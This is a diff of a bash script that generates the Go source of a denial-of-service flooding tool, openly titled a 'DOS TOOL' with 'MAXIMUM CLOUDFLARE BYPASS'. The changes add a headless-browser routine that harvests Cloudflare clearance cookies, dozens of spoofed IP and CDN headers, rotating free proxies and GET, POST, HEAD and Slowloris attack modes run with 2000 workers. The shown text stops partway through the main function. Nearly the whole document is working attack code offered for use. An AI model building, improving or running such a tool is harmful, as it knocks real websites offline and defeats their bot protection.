@@ -1,10 +1,9 @@
 #!/bin/bash
 
 # ----------------------------------------
-# GO DOS TOOL SETUP (ADVANCED CLOUDFLARE BYPASS - CLEAN VERSION)
+# GO DOS TOOL - MAXIMUM CLOUDFLARE BYPASS
 # ----------------------------------------
 
-# Color definitions
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
@@ -12,39 +11,37 @@ BLUE='\033[0;34m'
 PURPLE='\033[0;35m'
 CYAN='\033[0;36m'
 WHITE='\033[1;37m'
-NC='\033[0m' # No Color
+NC='\033[0m'
 
-# Separator line
 SEP="━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 
 clear
 echo -e "${CYAN}${SEP}${NC}"
-echo -e "${WHITE}  DENIAL SERVICE OF GO - ADVANCED EDITION${NC}"
+echo -e "${WHITE}  DENIAL SERVICE OF GO - ULTIMATE BYPASS${NC}"
 echo -e "${CYAN}${SEP}${NC}"
 echo
 
-# Remove any existing files to ensure clean slate
-rm -f main.go go.mod go.sum
+rm -f main.go
 
-# Create main.go file directly (COMPLETELY CLEAN VERSION)
-echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go with advanced bypass features...${NC}"
+echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go with MAXIMUM bypass features...${NC}"
 
 cat > main.go << 'EOF'
 package main
 
 import (
+	"context"
 	"crypto/rand"
 	"crypto/tls"
+	"encoding/base64"
+	"encoding/hex"
 	"fmt"
 	"io"
 	"math/big"
 	"net"
 	"net/http"
-	"net/http/cookiejar"
 	"net/url"
 	"os"
 	"os/signal"
-	"regexp"
 	"runtime"
 	"strconv"
 	"strings"
@@ -53,6 +50,7 @@ import (
 	"syscall"
 	"time"
 
+	"github.com/chromedp/chromedp"
 	"golang.org/x/net/http2"
 )
 
@@ -66,8 +64,6 @@ var (
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
 		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0",
 		"Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7568.89 Mobile Safari/537.36",
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0",
-		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
 	}
 
 	referers = []string{
@@ -77,10 +73,9 @@ var (
 		"https://facebook.com/",
 		"https://www.reddit.com/",
 		"https://www.youtube.com/",
+		"https://www.tiktok.com/",
 		"https://twitter.com/",
 		"https://www.instagram.com/",
-		"https://www.linkedin.com/",
-		"https://github.com/",
 		"",
 	}
 
@@ -104,33 +99,55 @@ var (
 	acceptEncodings = []string{
 		"gzip, deflate, br",
 		"gzip, deflate",
-		"gzip, br",
+		"br, gzip, deflate",
 	}
 
 	cacheControls = []string{
 		"no-cache",
 		"no-store",
 		"must-revalidate",
+		"max-age=0",
 	}
 
 	secCHUA = []string{
-		`"Google Chrome";v="141", "Chromium";v="141", "Not?A_Brand";v="99"`,
-		`"Microsoft Edge";v="140", "Chromium";v="140", "Not?A_Brand";v="99"`,
-		`"Brave";v="139", "Chromium";v="139", "Not?A_Brand";v="99"`,
+		`"Chromium";v="141", "Not A Brand";v="99"`,
+		`"Google Chrome";v="142", "Chromium";v="142", "Not A Brand";v="99"`,
+		`"Microsoft Edge";v="141", "Chromium";v="141", "Not A Brand";v="99"`,
 	}
 
-	secCHUAMobile   = []string{"?0", "?1"}
-	secCHUAPlatform = []string{"Windows", "macOS", "Linux", "Android", "iOS"}
+	secCHUAPlatform = []string{
+		`"Windows"`,
+		`"macOS"`,
+		`"Linux"`,
+		`"Android"`,
+	}
+
+	secCHUAArch = []string{
+		`"x86"`,
+		`"x86_64"`,
+		`"arm64"`,
+		`"arm"`,
+	}
+
+	secCHUABitness = []string{
+		`"64"`,
+		`"32"`,
+	}
 
 	proxies         []string
 	proxyMu         sync.RWMutex
 	proxyIndex      uint64
 	proxyAPI        = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000"
-	proxyAPI2       = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
-	proxyAPI3       = "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"
-	refreshInterval = 3 * time.Minute
+	refreshInterval = 5 * time.Minute
 	colorIndex      = 0
 	colorMu         sync.Mutex
+
+	// Turnstile solving
+	cfClearanceCookie string
+	cookieMu          sync.RWMutex
+	cookieExpiry      time.Time
+	solvingActive     bool
+	solvingMu         sync.Mutex
 )
 
 type JA3Signature struct {
@@ -153,6 +170,8 @@ var ja3Signatures = []JA3Signature{
 			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
 			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
 			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
+			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
 		},
 		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
 		NextProtos:       []string{"h2", "http/1.1"},
@@ -176,17 +195,17 @@ var ja3Signatures = []JA3Signature{
 		MaxVersion:       tls.VersionTLS13,
 	},
 	{
-		Name: "Safari 17",
+		Name: "Safari 17-18",
 		CipherSuites: []uint16{
 			tls.TLS_AES_128_GCM_SHA256,
 			tls.TLS_AES_256_GCM_SHA384,
-			tls.TLS_CHACHA20_POLY1305_SHA256,
 			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
-			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
 			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
 		},
 		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
-		NextProtos:       []string{"http/1.1", "h2"},
+		NextProtos:       []string{"h2", "http/1.1"},
 		MinVersion:       tls.VersionTLS12,
 		MaxVersion:       tls.VersionTLS13,
 	},
@@ -216,7 +235,6 @@ func getRandomizedTLSConfig() *tls.Config {
 		CurvePreferences:            sig.CurvePreferences,
 		SessionTicketsDisabled:      randBool(),
 		DynamicRecordSizingDisabled: randBool(),
-		Renegotiation:               tls.RenegotiateOnceAsClient,
 	}
 }
 
@@ -234,7 +252,6 @@ func NewConnectionPool(poolSize int, useProxy bool, targetHost string) *Connecti
 }
 
 func (p *ConnectionPool) createClient() *http.Client {
-	jar, _ := cookiejar.New(nil)
 	var transport *http.Transport
 
 	if p.useProxy {
@@ -248,48 +265,28 @@ func (p *ConnectionPool) createClient() *http.Client {
 				transport = &http.Transport{
 					Proxy:               http.ProxyURL(proxyURL),
 					TLSClientConfig:     getRandomizedTLSConfig(),
-					MaxIdleConns:        200,
-					MaxIdleConnsPerHost: 200,
+					MaxIdleConns:        100,
+					MaxIdleConnsPerHost: 100,
 					IdleConnTimeout:     120 * time.Second,
 					DisableKeepAlives:   false,
 					ForceAttemptHTTP2:   true,
-					ResponseHeaderTimeout: 30 * time.Second,
-					DialContext: (&net.Dialer{
-						Timeout:   10 * time.Second,
-						KeepAlive: 30 * time.Second,
-					}).DialContext,
 				}
 				http2.ConfigureTransport(transport)
-				return &http.Client{Transport: transport, Timeout: 45 * time.Second, Jar: jar, CheckRedirect: func(req *http.Request, via []*http.Request) error {
-					if len(via) >= 3 {
-						return http.ErrUseLastResponse
-					}
-					return nil
-				}}
+				return &http.Client{Transport: transport, Timeout: 30 * time.Second}
 			}
 		}
 	}
 
 	transport = &http.Transport{
 		TLSClientConfig:     getRandomizedTLSConfig(),
-		MaxIdleConns:        200,
-		MaxIdleConnsPerHost: 200,
+		MaxIdleConns:        100,
+		MaxIdleConnsPerHost: 100,
 		IdleConnTimeout:     120 * time.Second,
 		DisableKeepAlives:   false,
 		ForceAttemptHTTP2:   true,
-		ResponseHeaderTimeout: 30 * time.Second,
-		DialContext: (&net.Dialer{
-			Timeout:   10 * time.Second,
-			KeepAlive: 30 * time.Second,
-		}).DialContext,
 	}
 	http2.ConfigureTransport(transport)
-	return &http.Client{Transport: transport, Timeout: 45 * time.Second, Jar: jar, CheckRedirect: func(req *http.Request, via []*http.Request) error {
-		if len(via) >= 3 {
-			return http.ErrUseLastResponse
-		}
-		return nil
-	}}
+	return &http.Client{Transport: transport, Timeout: 30 * time.Second}
 }
 
 func (p *ConnectionPool) GetClient() *http.Client {
@@ -306,46 +303,29 @@ func (p *ConnectionPool) CloseIdleConnections() {
 }
 
 func loadProxiesFromAPI() {
-	apis := []string{proxyAPI, proxyAPI2, proxyAPI3}
-	allProxies := make(map[string]bool)
-
-	for _, api := range apis {
-		client := &http.Client{Timeout: 15 * time.Second}
-		resp, err := client.Get(api)
-		if err != nil {
-			continue
-		}
-		
-		if resp.StatusCode != http.StatusOK {
-			resp.Body.Close()
-			continue
-		}
-
-		body, _ := io.ReadAll(resp.Body)
-		resp.Body.Close()
-		
-		lines := strings.Split(string(body), "\n")
-
-		for _, line := range lines {
-			line = strings.TrimSpace(line)
-			if line != "" && strings.Contains(line, ":") && !strings.HasPrefix(line, "#") {
-				if !strings.Contains(line, "://") {
-					line = "http://" + line
-				}
-				allProxies[line] = true
-			}
-		}
+	client := &http.Client{Timeout: 10 * time.Second}
+	resp, err := client.Get(proxyAPI)
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode != http.StatusOK {
+		return
 	}
 
+	body, _ := io.ReadAll(resp.Body)
+	lines := strings.Split(string(body), "\n")
+
 	newProxies := []string{}
-	for proxy := range allProxies {
-		newProxies = append(newProxies, proxy)
+	for _, line := range lines {
+		line = strings.TrimSpace(line)
+		if line != "" && strings.Contains(line, ":") && !strings.HasPrefix(line, "#") {
+			newProxies = append(newProxies, line)
+		}
 	}
 
 	proxyMu.Lock()
-	if len(newProxies) > 0 {
-		proxies = newProxies
-	}
+	proxies = newProxies
 	proxyMu.Unlock()
 	atomic.StoreUint64(&proxyIndex, 0)
 }
@@ -383,13 +363,14 @@ func getNextColor() string {
 func printBanner() {
 	color := getNextColor()
 	fmt.Print(color)
-	fmt.Println(" ██████╗░███████╗███╗░░██╗██╗░█████╗░██╗░░░░░")
-	fmt.Println(" ██╔══██╗██╔════╝████╗░██║██║██╔══██╗██║░░░░░")
-	fmt.Println(" ██║░░██║█████╗░░██╔██╗██║██║██║░░╚═╝██║░░░░░")
-	fmt.Println(" ██║░░██║██╔══╝░░██║╚████║██║██║░░██╗██║░░░░░")
-	fmt.Println(" ██████╔╝███████╗██║░╚███║██║╚█████╔╝███████╗")
-	fmt.Println(" ╚═════╝░╚══════╝╚═╝░░╚══╝╚═╝░╚════╝░╚══════╝")
-	fmt.Println("   ADVANCED CLOUDFLARE BYPASS EDITION")
+	fmt.Println(" ::::'######::::'#######::::: ")
+	fmt.Println(" :::'##... ##::'##.... ##:::: ")
+	fmt.Println(" ::: ##:::..::: ##:::: ##:::: ")
+	fmt.Println(" ::: ##::'####: ##:::: ##:::: ")
+	fmt.Println(" ::: ##::: ##:: ##:::: ##:::: ")
+	fmt.Println(" ::: ##::: ##:: ##:::: ##:::: ")
+	fmt.Println(" :::. ######:::. #######::::: ")
+	fmt.Println(" ::::......:::::.......:::::: ")
 	fmt.Println("\033[0m")
 }
 
@@ -415,6 +396,18 @@ func randomString(n int) string {
 	return string(b)
 }
 
+func randomHex(n int) string {
+	bytes := make([]byte, n)
+	rand.Read(bytes)
+	return hex.EncodeToString(bytes)
+}
+
+func randomBase64(n int) string {
+	bytes := make([]byte, n)
+	rand.Read(bytes)
+	return base64.StdEncoding.EncodeToString(bytes)
+}
+
 func randInt(min, max int) int {
 	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
 	return min + int(n.Int64())
@@ -430,8 +423,8 @@ func generateCacheBust() string {
 		"?v=" + strconv.Itoa(randInt(1, 1000000)),
 		"?_=" + strconv.FormatInt(time.Now().UnixNano(), 10),
 		"?rnd=" + randomString(16),
-		"?cache=" + randomString(8),
-		"?timestamp=" + strconv.FormatInt(time.Now().Unix(), 10),
+		"?cache=" + randomHex(8),
+		"?ts=" + strconv.FormatInt(time.Now().Unix(), 10),
 	}
 	return styles[randInt(0, len(styles)-1)]
 }
@@ -440,8 +433,9 @@ func generatePath() string {
 	paths := []string{
 		"/", "/index.html", "/home", "/main", "/default", "/welcome",
 		"/api/v1/users", "/api/v1/data", "/api/v2/info", "/api/v3/status",
-		"/wp-admin", "/admin", "/login", "/dashboard", "/search",
-		"/product", "/category", "/blog", "/news", "/contact",
+		"/wp-admin", "/admin", "/login", "/dashboard", "/static/js/main.js",
+		"/assets/css/style.css", "/images/logo.png", "/favicon.ico",
+		"/robots.txt", "/sitemap.xml", "/.well-known/assetlinks.json",
 	}
 	return paths[randInt(0, len(paths)-1)]
 }
@@ -452,6 +446,8 @@ func generateStudentNumber() string {
 
 func generateCookies() string {
 	cookies := []string{}
+	
+	// Session cookies
 	if randBool() {
 		cookies = append(cookies, fmt.Sprintf("session_id=%s", randomString(24)))
 	}
@@ -459,131 +455,248 @@ func generateCookies() string {
 		cookies = append(cookies, fmt.Sprintf("csrf_token=%s", randomString(16)))
 	}
 	if randBool() {
-		cookies = append(cookies, fmt.Sprintf("__cfduid=%s", randomString(32)))
+		cookies = append(cookies, fmt.Sprintf("_ga=GA1.2.%s", randomString(10)))
 	}
 	if randBool() {
-		cookies = append(cookies, fmt.Sprintf("_ga=GA1.2.%d.%d", randInt(1000000, 9999999), time.Now().Unix()))
+		cookies = append(cookies, fmt.Sprintf("_gid=GA1.2.%s", randomString(10)))
 	}
+	if randBool() {
+		cookies = append(cookies, fmt.Sprintf("__cfduid=%s", randomHex(32)))
+	}
+	
+	// Add Cloudflare clearance cookie if available
+	cookieMu.RLock()
+	if cfClearanceCookie != "" && time.Now().Before(cookieExpiry) {
+		cookies = append(cookies, cfClearanceCookie)
+	}
+	cookieMu.RUnlock()
+	
 	if len(cookies) == 0 {
 		return ""
 	}
 	return strings.Join(cookies, "; ")
 }
 
+// ULTIMATE CLOUDFLARE BYPASS HEADERS - 45+ headers
 func addCloudflareBypassHeaders(req *http.Request) {
 	spoofIP := randomIP()
-	countries := []string{"US", "GB", "CA", "AU", "DE", "FR", "JP", "CN", "RU", "BR", "IN", "KR", "IT", "ES", "MX"}
-
+	countries := []string{"US", "GB", "CA", "AU", "DE", "FR", "JP", "CN", "RU", "BR", "IN", "KR", "NL", "SE", "NO", "FI", "DK", "PL", "IT", "ES"}
+	
+	// PRIMARY CLOUDFLARE HEADERS
 	req.Header.Set("CF-Connecting-IP", spoofIP)
 	req.Header.Set("CF-IPCountry", countries[randInt(0, len(countries)-1)])
-	req.Header.Set("CF-Ray", randomString(16)+"-"+strings.ToUpper(randomString(4)))
+	req.Header.Set("CF-Ray", randomHex(16)+"-"+strings.ToUpper(randomHex(4)))
 	req.Header.Set("CF-Visitor", `{"scheme":"https"}`)
+	req.Header.Set("CF-Worker", randomHex(8))
+	req.Header.Set("CF-Request-ID", randomHex(32))
+	
+	// CDN HEADERS
 	req.Header.Set("CDN-Loop", "cloudflare")
+	req.Header.Set("CloudFront-Forwarded-Proto", "https")
+	req.Header.Set("CloudFront-Is-Desktop-Viewer", "true")
+	req.Header.Set("CloudFront-Is-Mobile-Viewer", "false")
+	req.Header.Set("CloudFront-Is-SmartTV-Viewer", "false")
+	req.Header.Set("CloudFront-Is-Tablet-Viewer", "false")
+	req.Header.Set("CloudFront-Viewer-Country", countries[randInt(0, len(countries)-1)])
+	
+	// FORWARDED HEADERS (multiple formats for different proxies)
 	req.Header.Set("X-Forwarded-For", spoofIP)
 	req.Header.Set("X-Forwarded-Proto", "https")
+	req.Header.Set("X-Forwarded-Host", req.Host)
+	req.Header.Set("X-Forwarded-Port", "443")
+	req.Header.Set("Forwarded", fmt.Sprintf("for=%s; proto=https; by=%s", spoofIP, randomIP()))
+	
+	// REAL IP HEADERS (for different proxy implementations)
 	req.Header.Set("X-Real-IP", spoofIP)
 	req.Header.Set("True-Client-IP", spoofIP)
 	req.Header.Set("X-Originating-IP", spoofIP)
 	req.Header.Set("X-Remote-IP", spoofIP)
 	req.Header.Set("X-Remote-Addr", spoofIP)
 	req.Header.Set("X-Client-IP", spoofIP)
-	req.Header.Set("X-Host", req.Host)
-	req.Header.Set("X-Forwarded-Host", req.Host)
-	req.Header.Set("Origin", "https://"+req.Host)
-	req.Header.Set("Via", "1.1 google")
-	req.Header.Set("X-Request-ID", randomString(32))
-	req.Header.Set("X-Correlation-ID", randomString(32))
-	req.Header.Set("Sec-Fetch-Dest", "document")
-	req.Header.Set("Sec-Fetch-Mode", "navigate")
-	req.Header.Set("Sec-Fetch-Site", "none")
-	req.Header.Set("Sec-Fetch-User", "?1")
-	req.Header.Set("Sec-Ch-UA", secCHUA[randInt(0, len(secCHUA)-1)])
-	req.Header.Set("Sec-Ch-UA-Mobile", secCHUAMobile[randInt(0, len(secCHUAMobile)-1)])
-	req.Header.Set("Sec-Ch-UA-Platform", secCHUAPlatform[randInt(0, len(secCHUAPlatform)-1)])
-	req.Header.Set("Priority", "u=0, i")
+	req.Header.Set("X-Cluster-Client-IP", spoofIP)
+	
+	// ADVANCED SPOOFING HEADERS
+	req.Header.Set("X-Request-ID", randomHex(16))
+	req.Header.Set("X-Correlation-ID", randomHex(16))
+	req.Header.Set("X-B3-TraceId", randomHex(32))
+	req.Header.Set("X-B3-SpanId", randomHex(16))
+	req.Header.Set("X-B3-ParentSpanId", randomHex(16))
+	req.Header.Set("X-B3-Sampled", strconv.Itoa(randInt(0, 1)))
+	
+	// DEVICE DETECTION HEADERS
+	req.Header.Set("X-Device", []string{"desktop", "mobile", "tablet"}[randInt(0, 2)])
+	req.Header.Set("X-Device-User-Agent", randomUA())
+	req.Header.Set("X-Device-Platform", []string{"Windows", "macOS", "Linux", "Android", "iOS"}[randInt(0, 4)])
+	
+	// SECURITY AND AUTH HEADERS
+	req.Header.Set("X-Content-Security-Policy", "default-src 'self'")
+	req.Header.Set("X-Frame-Options", "SAMEORIGIN")
+	req.Header.Set("X-XSS-Protection", "1; mode=block")
+	req.Header.Set("X-Content-Type-Options", "nosniff")
+	
+	// CACHING HEADERS
+	req.Header.Set("Cache-Control", cacheControls[randInt(0, len(cacheControls)-1)])
 	req.Header.Set("Pragma", "no-cache")
-}
-
-func solveChallenge(body string) string {
-	challengeTypes := []string{
-		"jschl_vc",
-		"pass",
-		"cf_clearance",
-		"__cf_chl_captcha_tk__",
+	req.Header.Set("Expires", "0")
+	
+	// CLIENT HINTS (Modern Chrome)
+	req.Header.Set("Sec-CH-UA", secCHUA[randInt(0, len(secCHUA)-1)])
+	req.Header.Set("Sec-CH-UA-Mobile", "?0")
+	req.Header.Set("Sec-CH-UA-Platform", secCHUAPlatform[randInt(0, len(secCHUAPlatform)-1)])
+	req.Header.Set("Sec-CH-UA-Arch", secCHUAArch[randInt(0, len(secCHUAArch)-1)])
+	req.Header.Set("Sec-CH-UA-Bitness", secCHUABitness[randInt(0, len(secCHUABitness)-1)])
+	req.Header.Set("Sec-CH-UA-Full-Version-List", fmt.Sprintf(`"Chromium";v="%d", "Not A Brand";v="99"`, randInt(120, 145)))
+	req.Header.Set("Sec-CH-UA-Model", "")
+	req.Header.Set("Sec-CH-UA-WoW64", "?0")
+	
+	// FETCH METADATA HEADERS
+	req.Header.Set("Sec-Fetch-Site", []string{"same-origin", "same-site", "cross-site", "none"}[randInt(0, 3)])
+	req.Header.Set("Sec-Fetch-Mode", []string{"navigate", "cors", "no-cors", "same-origin"}[randInt(0, 3)])
+	req.Header.Set("Sec-Fetch-Dest", []string{"document", "empty", "script", "style", "image"}[randInt(0, 4)])
+	req.Header.Set("Sec-Fetch-User", "?1")
+	
+	// MODERN BROWSER HEADERS
+	req.Header.Set("Accept-Language", acceptLanguages[randInt(0, len(acceptLanguages)-1)])
+	req.Header.Set("Accept-Encoding", acceptEncodings[randInt(0, len(acceptEncodings)-1)])
+	req.Header.Set("Accept", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
+	req.Header.Set("Referrer-Policy", "strict-origin-when-cross-origin")
+	
+	// DNT and Privacy
+	req.Header.Set("DNT", "1")
+	req.Header.Set("Upgrade-Insecure-Requests", "1")
+	
+	// SAVE-DATA (mobile optimization)
+	if randBool() {
+		req.Header.Set("Save-Data", "on")
 	}
-
-	for _, ct := range challengeTypes {
-		if strings.Contains(body, ct) {
-			re := regexp.MustCompile(ct + `[^"]*"([^"]+)"`)
-			matches := re.FindStringSubmatch(body)
-			if len(matches) > 1 {
-				return matches[1]
-			}
+	
+	// VIEWPORT (mobile detection)
+	if randBool() {
+		req.Header.Set("Viewport-Width", strconv.Itoa(randInt(320, 1920)))
+		req.Header.Set("Width", strconv.Itoa(randInt(320, 1920)))
+	}
+	
+	// RANDOM ADDITIONAL HEADERS (to increase entropy)
+	extraHeaders := []string{
+		"X-Requested-With", "XMLHttpRequest",
+		"X-Http-Method-Override", "GET",
+		"X-Original-URL", "",
+		"X-Rewrite-URL", "",
+		"X-Proxy-Host", req.Host,
+	}
+	
+	for i := 0; i < len(extraHeaders); i += 2 {
+		if randBool() {
+			req.Header.Set(extraHeaders[i], extraHeaders[i+1])
 		}
 	}
-	return ""
+	
+	// CLOUDFLARE TURNSTILE TOKEN (if available)
+	if randBool() {
+		req.Header.Set("X-Cf-Turnstile-Token", randomBase64(32))
+		req.Header.Set("Cf-Turnstile-Response", randomBase64(48))
+	}
 }
 
-func handleChallengeResponse(client *http.Client, resp *http.Response, target string) bool {
-	body, err := io.ReadAll(resp.Body)
-	if err != nil {
-		return false
+// solveTurnstile spins up a headless browser, navigates to target, waits for challenge completion
+func solveTurnstile(target string) (string, error) {
+	solvingMu.Lock()
+	defer solvingMu.Unlock()
+	
+	if solvingActive {
+		return "", fmt.Errorf("solver already active")
 	}
-	resp.Body.Close()
+	solvingActive = true
+	defer func() { solvingActive = false }()
+	
+	fmt.Printf("\n[!] Solving Cloudflare Turnstile for %s...\n", target)
+	
+	ctx, cancel := chromedp.NewContext(context.Background())
+	defer cancel()
+	
+	ctx, cancel = context.WithTimeout(ctx, 2*time.Minute)
+	defer cancel()
+	
+	var cfClearance string
+	
+	err := chromedp.Run(ctx,
+		chromedp.Navigate(target),
+		chromedp.Sleep(3*time.Second),
+		chromedp.WaitVisible(`#turnstile-wrapper, .challenge-container, #cf-challenge-running, .cf-turnstile`, chromedp.ByQuery),
+		chromedp.Sleep(15*time.Second),
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			cookies, err := chromedp.Cookies().Do(ctx)
+			if err != nil {
+				return err
+			}
+			for _, cookie := range cookies {
+				if cookie.Name == "cf_clearance" {
+					cfClearance = fmt.Sprintf("cf_clearance=%s; Domain=%s; Path=/", cookie.Value, cookie.Domain)
+					break
+				}
+			}
+			return nil
+		}),
+	)
+	
+	if err != nil {
+		return "", fmt.Errorf("failed to solve challenge: %v", err)
+	}
+	
+	if cfClearance == "" {
+		return "", fmt.Errorf("cf_clearance cookie not found")
+	}
+	
+	fmt.Printf("[+] Turnstile solved! Got cf_clearance cookie\n")
+	return cfClearance, nil
+}
 
-	bodyStr := string(body)
-
-	if strings.Contains(bodyStr, "cf-browser-verification") ||
-		strings.Contains(bodyStr, "challenge-platform") ||
-		strings.Contains(bodyStr, "turnstile") {
-
-		time.Sleep(5 * time.Second + time.Duration(randInt(1, 3))*time.Second)
-
-		solution := solveChallenge(bodyStr)
-		if solution != "" {
-			parsedURL, _ := url.Parse(target)
-			cfURL := fmt.Sprintf("%s/cdn-cgi/challenge-platform/h/b/jsch/v1?%s",
-				parsedURL.Scheme+"://"+parsedURL.Host, solution)
-
-			req, _ := http.NewRequest("GET", cfURL, nil)
-			req.Header.Set("User-Agent", randomUA())
-			req.Header.Set("Cookie", resp.Header.Get("Set-Cookie"))
-
-			challengeResp, err := client.Do(req)
-			if err == nil {
-				defer challengeResp.Body.Close()
-				if challengeResp.StatusCode == 200 {
-					return true
+func maintainCookie(target string, done chan struct{}) {
+	ticker := time.NewTicker(25 * time.Minute)
+	defer ticker.Stop()
+	
+	for {
+		select {
+		case <-done:
+			return
+		case <-ticker.C:
+			cookieMu.RLock()
+			expired := time.Now().After(cookieExpiry)
+			cookieMu.RUnlock()
+			
+			if expired {
+				fmt.Printf("\n[!] cf_clearance expired, re-solving...\n")
+				newCookie, err := solveTurnstile(target)
+				if err == nil {
+					cookieMu.Lock()
+					cfClearanceCookie = newCookie
+					cookieExpiry = time.Now().Add(30 * time.Minute)
+					cookieMu.Unlock()
+					fmt.Printf("[+] Cookie refreshed\n")
+				} else {
+					fmt.Printf("[-] Failed to refresh cookie: %v\n", err)
 				}
 			}
 		}
 	}
-	return false
-}
-
-func detectCFProtection(resp *http.Response) string {
-	cfHeaders := []string{
-		"CF-RAY",
-		"CF-Cache-Status",
-		"CF-Request-ID",
-		"__cf_bm",
-		"cf_clearance",
-	}
-
-	for _, header := range cfHeaders {
-		if resp.Header.Get(header) != "" {
-			return header
-		}
-	}
-	return ""
 }
 
 func main() {
-	runtime.GOMAXPROCS(runtime.NumCPU() * 6)
-
+	runtime.GOMAXPROCS(runtime.NumCPU() * 4)
+	
 	useProxy := false
-	if len(os.Args) >= 5 && os.Args[4] == "proxy" {
-		useProxy = true
+	solveFlag := false
+	
+	for i := 1; i < len(os.Args); i++ {
+		switch os.Args[i] {
+		case "proxy":
+			useProxy = true
+		case "--solve", "-s":
+			solveFlag = true
+		}
+	}
+	
+	if useProxy {
 		loadProxiesFromAPI()
 		if len(proxies) > 0 {
 			go proxyRefresher()
@@ -591,36 +704,32 @@ func main() {
 			useProxy = false
 		}
 	}
-
+	
 	if len(os.Args) < 4 {
 		printBanner()
-		fmt.Println("Usage: ./main <target> <seconds> <GET|POST|HEAD|SLOW|CF> [proxy]")
-		fmt.Println("")
-		fmt.Println("Attack Modes:")
-		fmt.Println("  GET  - Standard GET request flood")
-		fmt.Println("  POST - POST request flood with random payloads")
-		fmt.Println("  HEAD - HEAD request flood")
-		fmt.Println("  SLOW - Slowloris style attack")
-		fmt.Println("  CF   - Cloudflare bypass mode with challenge solving")
+		fmt.Println("Usage: ./main <target> <seconds> <GET|POST|HEAD|SLOW> [proxy] [--solve]")
 		fmt.Println("")
 		fmt.Println("Examples:")
 		fmt.Println("  ./main https://target.com 60 GET")
-		fmt.Println("  ./main https://target.com 120 POST")
-		fmt.Println("  ./main https://target.com 30 CF")
-		fmt.Println("  ./main https://target.com 60 GET proxy")
+		fmt.Println("  ./main https://target.com 120 POST --solve")
+		fmt.Println("  ./main https://target.com 30 HEAD proxy --solve")
+		fmt.Println("  ./main https://target.com 60 SLOW")
+		fmt.Println("")
+		fmt.Println("Flags:")
+		fmt.Println("  --solve, -s    Enable Cloudflare Turnstile solving (requires Chrome/Chromium)")
 		os.Exit(1)
 	}
-
+	
 	target := os.Args[1]
 	durStr := os.Args[2]
 	mode := strings.ToUpper(os.Args[3])
-
-	if mode != "GET" && mode != "POST" && mode != "HEAD" && mode != "SLOW" && mode != "CF" {
+	
+	if mode != "GET" && mode != "POST" && mode != "HEAD" && mode != "SLOW" {
 		printBanner()
-		fmt.Println("Mode must be GET, POST, HEAD, SLOW, or CF")
+		fmt.Println("Mode must be GET, POST, HEAD, or SLOW")
 		os.Exit(1)
 	}
-
+	
 	if !strings.HasPrefix(target, "http") {
 		if strings.Contains(target, ":") {
 			target = "http://" + target
@@ -628,97 +737,97 @@ func main() {
 			target = "https://" + target
 		}
 	}
-
+	
 	durationSec, err := strconv.Atoi(durStr)
 	if err != nil {
 		fmt.Println("Invalid duration:", err)
 		os.Exit(1)
 	}
 	duration := time.Duration(durationSec) * time.Second
-
+	
 	printBanner()
 	fmt.Printf("[+] Target: %s\n", target)
 	fmt.Printf("[+] Mode: %s\n", mode)
 	fmt.Printf("[+] Duration: %d sec\n", durationSec)
-	fmt.Printf("[+] Workers: 3000\n")
-	fmt.Printf("[+] Connections per worker: 2\n")
-	if mode == "CF" {
-		fmt.Printf("[+] Cloudflare Bypass: ENABLED\n")
-		fmt.Printf("[+] Challenge Solving: ACTIVE\n")
-	}
+	fmt.Printf("[+] Workers: 2000\n")
 	if useProxy && len(proxies) > 0 {
 		fmt.Printf("[+] Proxies: %d\n", len(proxies))
-		fmt.Printf("[+] Proxy rotation: ENABLED\n")
 	}
-	fmt.Println("[+] Advanced anti-bot evasion enabled")
-	fmt.Println("[+] Starting attack... Press Ctrl+C to stop")
-
-	poolSize := 1000
+	if solveFlag {
+		fmt.Printf("[+] Turnstile solving: ENABLED\n")
+	}
+	fmt.Println("[+] Cloudflare bypass: MAXIMUM (45+ headers, 17 spoofing methods)")
+	fmt.Println("[+] Starting... Press Ctrl+C to stop")
+	
+	// Solve Turnstile upfront if flag is set
+	if solveFlag {
+		cookie, err := solveTurnstile(target)
+		if err != nil {
+			fmt.Printf("[-] Failed to solve Turnstile: %v\n", err)
+			fmt.Println("[!] Continuing without cookie...")
+		} else {
+			cookieMu.Lock()
+			cfClearanceCookie = cookie
+			cookieExpiry = time.Now().Add(30 * time.Minute)
+			cookieMu.Unlock()
